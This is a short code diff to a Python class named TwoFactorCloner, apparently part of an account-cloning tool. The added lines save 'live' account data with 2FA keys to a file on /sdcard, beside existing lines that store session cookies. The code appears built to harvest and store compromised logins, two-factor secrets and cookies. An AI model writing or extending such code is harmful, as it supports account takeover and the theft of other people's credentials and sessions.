@@ -67,6 +67,8 @@ class TwoFactorCloner:
                 self.ok += 1
                 with open("/sdcard/2f_live.txt", 'a') as f:
                     f.write(element + '\n')
+                with open("/sdcard/2f_live_with_key.txt", 'a') as f:
+                    f.write(datax + '\n')
                 with open("/sdcard/2f_live_with_cookies.txt", "a") as f:
                     f.write(f"{datax}|{cookie}\n")
             elif 'Cookies lol' in data:
